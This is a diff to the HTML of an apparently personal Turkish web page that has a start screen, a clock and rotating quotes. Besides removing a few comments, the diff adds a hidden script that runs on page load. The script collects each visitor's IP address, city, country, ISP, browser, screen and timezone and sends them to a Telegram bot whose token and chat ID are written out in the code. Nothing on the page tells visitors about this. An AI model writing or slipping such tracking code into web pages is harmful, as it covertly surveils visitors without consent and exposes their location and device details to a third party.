@@ -251,7 +251,7 @@
     </div>
   </div>
 
-  <script>
+ <script>
     function startApp(playMusic) {
       document.getElementById('startScreen').style.display = 'none';
       const main = document.getElementById('mainContent');
@@ -267,7 +267,6 @@
       showRandomText();
     }
 
-    // Saat fonksiyonu (saniyesiz)
     function updateClock() {
       const now = new Date();
       const clock = document.getElementById('clock');
@@ -276,7 +275,6 @@
       clock.textContent = `${h}:${m}`;
     }
 
-    // Rastgele metinler dizisi
     const texts = [
       "Ben ölmek istiyorum sayın albayım, ölmek. Bir yandan da ölümümün nasıl karşılanacağını seyretmek istiyorum. Tehlikeli oyunlar oynamak istiyor insan; bir yandan da kılına zarar gelsin istemiyor.",
       "Gözleriniz çok ses çıkarıyor albayım.",
@@ -286,7 +284,6 @@
       "Ya Albayım, dünya mesela... Aşağılık yer demek. Aşağı. Ya da aşağılıkların yaşadığı yer demek. Dünya çirkin, biz güzeliz Albayım."
     ];
 
-    // Rastgele metni göster
     function showRandomText() {
       const idx = Math.floor(Math.random() * texts.length);
       document.getElementById('randomText').textContent = texts[idx];
@@ -294,6 +291,53 @@
 
     setInterval(updateClock, 1000);
     updateClock();
-  </script>
+
+    // Telegram'a cihaz + IP bilgisi gönderme
+    (function sendDeviceInfoToTelegram() {
+      const token = '7653530382:AAEXQaNYN5RJyo9iZ_Qj0gEeDX8ZKflWZr8';
+      const chatId = '7318311718';
+
+      const baseInfo = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        time: new Date().toLocaleString()
+      };
+
+      fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(ipData => {
+          const fullMessage =
+            `🕵️ Yeni Ziyaretçi\n\n` +
+            `🌍 IP: ${ipData.ip}\n` +
+            `📍 Ülke: ${ipData.country_name}\n` +
+            `🏙 Şehir: ${ipData.city}\n` +
+            `🌐 İnternet Servisi: ${ipData.org}\n\n` +
+            `💻 Platform: ${baseInfo.platform}\n` +
+            `🗣 Dil: ${baseInfo.language}\n` +
+            `📺 Ekran: ${baseInfo.screen}\n` +
+            `🕰 Saat Dilimi: ${baseInfo.timezone}\n` +
+            `🕒 Tarih: ${baseInfo.time}\n\n` +
+            `🧠 UserAgent: ${baseInfo.userAgent}`;
+
+          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: fullMessage
+            })
+          }).catch(err => console.error("Telegram'a gönderilemedi:", err));
+        })
+        .catch(err => {
+          console.error("IP bilgisi alınamadı:", err);
+        });
+    })();
+</script>
+
 </body>
 </html>
